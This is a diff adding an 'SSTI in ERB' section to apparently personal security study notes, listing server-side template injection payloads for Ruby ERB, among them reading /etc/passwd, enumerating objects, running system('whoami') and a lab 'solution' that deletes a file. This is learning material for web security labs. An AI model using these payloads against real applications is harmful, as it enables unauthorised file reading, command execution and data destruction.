@@ -4022,3 +4022,57 @@ from -e:4:in `<main>'
 
 - You should be aware that the same payload can sometimes return a successful response in more than one template language. For example, the payload {{7*'7'}} returns 49 in Twig and 7777777 in Jinja2. Therefore, it is important not to jump to conclusions based on a single successful response.
 
+--------------
+
+### SSTI in ERB
+
+--------------
+
+- Executing code in erb is with `<%=code %>`
+- Try to read files-:
+
+```ruby
+ <%= File.open('/etc/passwd').read %>
+```
+
+![image](https://github.com/user-attachments/assets/81e01589-2478-4d41-86ad-78d332a44ac8)
+
+- Next step is enumerate methods and classes with `self`.
+
+```ruby
+<%= self %>
+```
+
+![image](https://github.com/user-attachments/assets/2acc19d9-bd28-4563-bbed-bd89d00ff8ff)
+
+- Obtaining the class name
+
+```ruby
+<%= self.class.name %>
+```
+
+![image](https://github.com/user-attachments/assets/998dc164-e35c-485b-8cc5-a696ee904091)
+
+- Command injection-:
+
+```ruby
+<%= system("whoami"); %>
+```
+
+![image](https://github.com/user-attachments/assets/e05b4b30-cfc8-4622-abf8-68bde69216f4)
+
+- Solution-:
+
+```ruby
+<%=system(%27rm+morale.txt%27)%>
+```
+
+![image](https://github.com/user-attachments/assets/ce114a9c-20d9-43ef-bb67-ef7c0d425718)
+
+--------------
+
+
+
+
+
+
